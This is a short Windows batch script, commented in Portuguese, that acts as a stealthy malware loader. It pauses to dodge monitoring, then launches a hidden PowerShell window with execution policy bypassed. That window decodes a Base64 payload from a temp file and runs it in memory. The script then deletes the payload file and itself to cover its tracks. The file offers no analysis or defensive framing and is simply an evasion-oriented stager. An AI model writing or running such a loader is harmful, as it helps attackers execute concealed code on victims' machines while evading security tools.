@echo off
set "p=%TEMP%\f.log"
:: Delay para quebrar a monitorização imediata
timeout /t 2 /nobreak >nul
:: Lê o Base64, descodifica e executa sem tocar no disco com o código real
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$b=Get-Content '%p%'; [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | iex"
del "%p%"
del "%~f0"
